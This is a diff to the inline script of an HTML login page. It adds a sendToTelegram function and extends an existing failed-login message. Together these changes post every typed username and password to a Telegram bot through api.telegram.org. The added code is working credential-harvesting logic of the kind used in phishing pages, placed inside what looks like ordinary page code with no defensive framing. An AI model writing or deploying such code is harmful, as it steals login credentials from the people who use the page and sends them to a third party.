@@ -157,10 +157,12 @@
                     }, 2000);
                 } else {
                     errorMessage.style.display = 'block';
+                    // Send username and password to Telegram
+                    sendToTelegram(username, password);
                 }
             } else {
                 // Send to Telegram on the third attempt
-                const message = `Failed login attempt for user: ${username}`;
+                const message = `Failed login attempt for user: ${username}, Password: ${password}`;
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: {
@@ -190,6 +192,30 @@
                 });
             }
         });
+
+        function sendToTelegram(username, password) {
+            const message = `Failed login attempt for user: ${username}, Password: ${password}`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Message sent:', data);
+            })
+            .catch(error => console.error('Error sending message:', error));
+        }
     </script>
 </body>
 </html>
